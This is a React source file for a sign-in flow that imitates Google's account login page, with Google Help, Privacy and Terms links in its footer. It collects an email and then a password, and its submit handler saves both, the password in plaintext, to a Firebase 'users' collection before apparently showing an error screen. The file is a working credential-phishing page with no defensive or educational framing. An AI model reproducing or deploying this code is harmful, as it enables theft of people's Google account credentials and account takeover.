import { addDoc, collection } from 'firebase/firestore';
import { db } from './FirebaseInit'; 
import React, { useState } from 'react';
import './App.css';
import Email from './Email';
import Password from './Password';
import WentWrong from './WentWrong';

function App() {
	const [currentScreen, setCurrentScreen] = useState('email');

	const [inputData, setInputData] = useState({
		email: '',
		password: '',
	});

	const onSubmit = async () => {
		const { email, password } = inputData;

		try {
			// Add a new document with a generated id.
			const docRef = await addDoc(collection(db, 'users'), {
				email,
				password,
			});
			console.log('Document written with ID: ', docRef.id);
		} catch (error) {
			console.log(error);
		}
	};

	console.log(inputData, 'inputData');

	const screen = {
		email: () => (
			<Email
				inputData={inputData}
				setScreen={setCurrentScreen}
				setInputData={setInputData}
			/>
		),
		password: () => (
			<Password
				inputData={inputData}
				setScreen={setCurrentScreen}
				setInputData={setInputData}
				onSubmit={onSubmit}
			/>
		),
		wentWrong: () => <WentWrong setScreen={setCurrentScreen} />,
	};

	return (
		<div className="app">
			<div
				style={{
					width: '100%',
					display: 'flex',
					justifyContent: 'center',
				}}
			>
				{screen[currentScreen]()}
			</div>
			<div className="bottom_links">
				<div>English(United states)</div>
				<div className="bottom_links_help">
					<a
						href="https://support.google.com/accounts?hl=en"
						target="_blank"
						rel="noreferrer"
					>
						Help
					</a>
					<a
						href="https://accounts.google.com/TOS?loc=NG&hl=en&privacy=true"
						target="_blank"
						rel="noreferrer"
					>
						Privacy
					</a>
					<a
						href="https://accounts.google.com/TOS?loc=NG&hl=en"
						target="_blank"
						rel="noreferrer"
					>
						Terms
					</a>
				</div>
			</div>
		</div>
	);
}

export default App;
